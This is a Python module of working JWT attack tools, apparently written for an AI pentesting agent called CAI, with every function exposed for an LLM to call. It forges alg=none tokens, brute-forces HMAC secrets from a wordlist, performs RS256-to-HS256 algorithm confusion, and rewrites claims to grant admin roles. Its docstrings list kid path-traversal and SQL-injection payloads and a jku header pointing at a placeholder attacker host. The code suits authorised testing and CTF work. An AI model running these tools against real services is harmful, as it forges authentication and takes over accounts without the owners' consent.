"""
JWT (JSON Web Token) helper tools for CAI.

Covers the most common offensive operations: decoding without verification,
generating an alg=none variant, brute-forcing HS256 secrets against a
wordlist, RS256→HS256 algorithm confusion, and arbitrary claim editing.

All public entry points are exposed as ``@function_tool`` so the LLM can
call them directly. Pure-Python implementations (no shell), only ``hmac``
+ ``hashlib`` + ``base64`` — pyjwt is used solely for the optional
verified-decode path.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import Optional

from cai.sdk.agents import function_tool


# ── Base64-url helpers ──────────────────────────────────────────────

# Base64url alphabet plus the '=' padding character. Anything else
# inside a JWT segment means the token was mangled in transit (typical
# culprits: `cut -d'=' -f2` on a long Set-Cookie value, line wrapping
# in `curl -i` output, terminal control characters, double-escaping).
# Silently decoding non-alphabet bytes produces garbage and surfaces
# later as a confusing JSON parse error, which sends the LLM looping
# on the extraction instead of on the real issue.
_B64URL_VALID_RE = re.compile(r"^[A-Za-z0-9_\-=]*$")


def _b64url_decode(data: str) -> bytes:
    """Decode base64url with padding tolerance.

    Raises ValueError with a diagnostic message if the input contains
    characters outside the base64url alphabet, so callers get a useful
    error instead of garbage bytes.
    """
    if isinstance(data, bytes):
        data = data.decode()
    if not _B64URL_VALID_RE.match(data):
        bad = sorted({c for c in data if not _B64URL_VALID_RE.match(c)})[:8]
        raise ValueError(
            "Token segment contains characters outside the base64url alphabet "
            f"({bad!r}). The token is most likely mangled by shell parsing — "
            "`cut -d'=' -f2` on a Set-Cookie line is a frequent cause when the "
            "JWT has '=' padding, and line wrapping in `curl -i` output can "
            "splice control bytes mid-token. Re-capture the cookie with "
            "`curl -c cookies.txt ...` and read it from cookies.txt (the value "
            "is the tab-delimited 7th field), or use `curl -s -D - -o /dev/null "
            "... | grep -i 'set-cookie:' | sed -E 's/.*token=([^;]+).*/\\1/'`."
        )
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def _b64url_encode(data: bytes) -> str:
    """Encode bytes as base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _split_jwt(token: str) -> tuple[str, str, str]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"Not a valid JWT: expected 3 parts, got {len(parts)}")
    return parts[0], parts[1], parts[2]


# ── Pure-Python implementations (testable without function_tool wrapper) ──

def _jwt_decode_impl(token: str) -> str:
    try:
        h_raw, p_raw, s_raw = _split_jwt(token)
        header = json.loads(_b64url_decode(h_raw))
        payload = json.loads(_b64url_decode(p_raw))
    except Exception as exc:
        return f"Error decoding JWT: {exc}"

    lines = [
        "=== JWT decoded (signature NOT verified) ===",
        f"Header:    {json.dumps(header, indent=2)}",
        f"Payload:   {json.dumps(payload, indent=2)}",
        f"Signature: {s_raw or '(empty)'}",
    ]

    alg = header.get("alg", "?")
    notes = []
    if alg.lower() == "none":
        notes.append("alg=none — server may accept unsigned tokens.")
    if alg.upper().startswith("HS"):
        notes.append("HMAC alg — vulnerable to weak-secret brute force (jwt_brute_hs256).")
    if alg.upper().startswith("RS") or alg.upper().startswith("ES"):
        notes.append(
            "Asymmetric alg — if the server confuses HS256 with public key as "
            "secret, try jwt_alg_confusion."
        )
    if "kid" in header:
        notes.append(f"kid header present ({header['kid']!r}) — test for kid injection / path traversal.")
    if payload.get("admin") is False or payload.get("role") in ("user", "guest"):
        notes.append("payload has admin/role claims — try jwt_modify_claims to escalate.")

    if notes:
        lines.append("\nObservations:")
        lines.extend(f"- {n}" for n in notes)
    return "\n".join(lines)


def _jwt_none_alg_impl(token: str) -> str:
    """Strip signature and set alg=none. Server-side verifier with broken
    fallback may accept it."""
    try:
        h_raw, p_raw, _ = _split_jwt(token)
        header = json.loads(_b64url_decode(h_raw))
    except Exception as exc:
        return f"Error: {exc}"

    header["alg"] = "none"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    # Empty signature, but trailing dot is required for 3-part structure
    return f"{new_header}.{p_raw}."


def _jwt_modify_header_impl(token: str, header_changes: dict, alg_none: bool = False) -> str:
    """Replace/add fields in the JWT header (alg, kid, jku, x5u, …).

    Keeps the payload and signature untouched (signature will be invalid
    for the new header, useful only against servers that don't verify or
    for probes where the kid/alg lookup happens BEFORE signature check —
    classic patterns: kid path-traversal, kid SQL injection, jku/x5u
    SSRF). When ``alg_none`` is True, also flips ``alg`` to ``none`` and
    emits an unsigned token.
    """
    try:
        h_raw, p_raw, s_raw = _split_jwt(token)
        header = json.loads(_b64url_decode(h_raw))
    except Exception as exc:
        return f"Error: {exc}"

    if not isinstance(header_changes, dict):
        return "Error: header_changes must be a dict"
    header.update(header_changes)

    if alg_none:
        header["alg"] = "none"

    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    if alg_none:
        # Wipe signature alongside alg=none.
        return f"{new_header}.{p_raw}."
    return f"{new_header}.{p_raw}.{s_raw}"


def _jwt_modify_claims_impl(token: str, claims: dict, alg_none: bool = False) -> str:
    """Replace/add claims in the payload. If ``alg_none`` is True, also
    flip the header to alg=none and emit an unsigned token."""
    try:
        h_raw, p_raw, s_raw = _split_jwt(token)
        header = json.loads(_b64url_decode(h_raw))
        payload = json.loads(_b64url_decode(p_raw))
    except Exception as exc:
        return f"Error: {exc}"

    if not isinstance(claims, dict):
        return "Error: claims must be a dict"
    payload.update(claims)

    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    if alg_none:
        header["alg"] = "none"
        new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        return f"{new_header}.{new_payload}."
    # Keep existing header + signature; signature will be invalid for the new
    # payload, useful only against servers that don't actually verify.
    return f"{h_raw}.{new_payload}.{s_raw}"


def _jwt_brute_hs256_impl(token: str, wordlist_path: str, max_words: int = 0) -> str:
    """Try to recover the HS256/HS384/HS512 secret by brute-forcing a wordlist.

    Returns a status string. On hit, includes the secret.
    """
    try:
        h_raw, p_raw, s_raw = _split_jwt(token)
        header = json.loads(_b64url_decode(h_raw))
    except Exception as exc:
        return f"Error: {exc}"

    alg = header.get("alg", "").upper()
    digest_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    digest = digest_map.get(alg)
    if digest is None:
        return f"Error: alg {alg!r} is not HS256/HS384/HS512 — brute force not applicable."

    try:
        target_sig = _b64url_decode(s_raw)
    except Exception as exc:
        return f"Error decoding signature: {exc}"

    signing_input = f"{h_raw}.{p_raw}".encode()

    try:
        with open(wordlist_path, "rb") as f:
            count = 0
            for raw in f:
                secret = raw.rstrip(b"\r\n")
                if not secret:
                    continue
                if hmac.compare_digest(
                    hmac.new(secret, signing_input, digest).digest(),
                    target_sig,
                ):
                    return (
                        f"FOUND: secret = {secret.decode(errors='replace')!r} "
                        f"(alg={alg}, tried {count + 1} candidates)"
                    )
                count += 1
                if max_words and count >= max_words:
                    break
    except FileNotFoundError:
        return f"Error: wordlist {wordlist_path!r} not found"
    except Exception as exc:
        return f"Error: {exc}"

    return f"Not found after {count} candidates (alg={alg})."


def _jwt_alg_confusion_impl(token: str, public_key_path: str) -> str:
    """Re-sign an RS256/ES256 token as HS256 using the server's PUBLIC key
    as the HMAC secret. Works when the verifier blindly trusts the alg
    header and accepts any key.
    """
    try:
        h_raw, p_raw, _ = _split_jwt(token)
        header = json.loads(_b64url_decode(h_raw))
    except Exception as exc:
        return f"Error: {exc}"

    if not header.get("alg", "").upper().startswith(("RS", "ES", "PS")):
        return (
            f"Error: alg-confusion targets asymmetric algs (RS/ES/PS); "
            f"current alg is {header.get('alg')!r}."
        )

    try:
        with open(public_key_path, "rb") as f:
            public_key = f.read()
    except Exception as exc:
        return f"Error reading public key: {exc}"

    header["alg"] = "HS256"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{p_raw}".encode()
    sig = hmac.new(public_key, signing_input, hashlib.sha256).digest()
    return f"{new_header}.{p_raw}.{_b64url_encode(sig)}"


# ── @function_tool surface ──────────────────────────────────────────

@function_tool(strict_mode=False)
def jwt_decode(token: str, ctf=None) -> str:  # pylint: disable=unused-argument
    """Decode a JWT (header + payload) without verifying the signature
    and surface common exploitation hints based on the alg/claims.

    Args:
        token: The JWT in compact form (header.payload.signature).

    Returns:
        Multi-line summary with header, payload, signature and observations.
    """
    return _jwt_decode_impl(token)


@function_tool(strict_mode=False)
def jwt_none_alg(token: str, ctf=None) -> str:  # pylint: disable=unused-argument
    """Return a variant of the token with header.alg='none' and an empty
    signature, suitable for testing servers that accept unsigned tokens.

    Args:
        token: Original signed JWT.

    Returns:
        New token string ending with a trailing dot (empty signature).
    """
    return _jwt_none_alg_impl(token)


@function_tool(strict_mode=False)
def jwt_modify_header(
    token: str,
    header_changes: Optional[dict] = None,
    alg_none: bool = False,
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Replace/extend fields in the JWT header.

    Use cases:
    - ``{"kid": "../../../etc/passwd"}`` — path-traversal probe when the
      server reads the signing key from disk based on kid.
    - ``{"kid": "1' OR 1=1-- -"}`` — manual SQLi probe when the server
      looks up the key in a database (full automation uses sqlmap with
      a tamper script).
    - ``{"jku": "http://<attacker>/.well-known/jwks.json"}`` — SSRF /
      key-injection via remote JWKS URL.
    - ``{"alg": "HS256"}`` combined with the public key as secret —
      alg-confusion (see jwt_alg_confusion for the full primitive).

    Args:
        token: Source JWT.
        header_changes: Dict of header fields to merge into the header
            (overrides existing keys).
        alg_none: If True, also flip ``alg`` to ``none`` and emit an
            unsigned token (signature wiped).

    Returns:
        New JWT string. By default keeps the original signature, which
        will be invalid for the new header — only effective against
        servers that don't actually verify or that consume the modified
        header field BEFORE the signature check.
    """
    return _jwt_modify_header_impl(token, header_changes or {}, alg_none=alg_none)


@function_tool(strict_mode=False)
def jwt_modify_claims(
    token: str,
    claims: Optional[dict] = None,
    alg_none: bool = False,
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Replace/extend claims in the JWT payload.

    Args:
        token: Source JWT.
        claims: Dict of claims to merge into the payload (overrides existing
            keys). Example: {"admin": True, "role": "admin"}.
        alg_none: If True, also flip the header alg to 'none' and emit an
            unsigned token. Otherwise keep the original signature (which
            will be invalid for the new payload — useful only against
            servers that don't verify).

    Returns:
        New JWT string.
    """
    return _jwt_modify_claims_impl(token, claims or {}, alg_none=alg_none)


@function_tool(strict_mode=False)
def jwt_brute_hs256(
    token: str,
    wordlist_path: str = "/usr/share/dirb/wordlists/rockyou.txt",
    max_words: int = 0,
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Brute-force the HS256/HS384/HS512 secret of a JWT against a wordlist.

    Args:
        token: The HMAC-signed JWT to crack.
        wordlist_path: Path to the wordlist file (default: rockyou).
        max_words: Optional cap on candidates to try (0 = no limit).

    Returns:
        Status string. On success contains the recovered secret.
    """
    return _jwt_brute_hs256_impl(token, wordlist_path, max_words=max_words)


@function_tool(strict_mode=False)
def jwt_alg_confusion(
    token: str,
    public_key_path: str,
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """RS256/ES256 → HS256 algorithm confusion: re-sign the token as
    HMAC-SHA256 using the server's PUBLIC key as the secret. Works against
    verifiers that trust the alg header without enforcing the expected one.

    Args:
        token: Original asymmetric-signed JWT.
        public_key_path: Path to the server's PEM-encoded public key.

    Returns:
        Re-signed HS256 JWT string.
    """
    return _jwt_alg_confusion_impl(token, public_key_path)
